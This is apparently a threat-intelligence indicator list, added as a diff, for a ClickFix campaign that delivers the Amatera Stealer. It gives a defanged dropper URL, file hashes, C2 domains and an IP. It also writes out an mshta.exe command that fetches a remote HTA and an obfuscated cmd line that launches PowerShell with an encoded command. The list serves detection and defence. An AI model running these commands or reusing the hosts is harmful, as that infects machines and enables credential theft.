@@ -1,0 +1,25 @@
+URL:
+
+hxxps://download.version-516[.]com/other - Dropper URL 
+
+Command Line:
+
+mshta.exe hxxps://download.version-516[.]com/other 
+
+ClickFix command:
+c:\windows\system32\cmd.EXE /v:on /c "set x=pow&&set y=ershell&&call C:\Windows\SysWOW64\WindowsPowerShell\v1.0\!x!!y! -E <BASE64> - CMD launching PowerShell with encoded command 
+
+File:
+
+534460224e1140ca7f512daea7258a9fce40dc0daef6994d79d08bdf4ce3e4b8 - HTA dropper
+e913fa5b2dd0a7fc3dbaf0a6f882b3ead9a58511bd945b6e5c478cbd2b900508 - Shellcode loader
+ec1206989449d30746b5ceb2b297cda9f3f09636a0e122ecafb40b1dc2e86772 - Amatera Stealer (Unpacked) 
+
+Domain:
+
+oakenfjrod.ru - Second stage dropper domain 
+compactedtightness.cfd - Amatera C2
+
+IP:
+
+77.91.97.244 - Amatera C2 
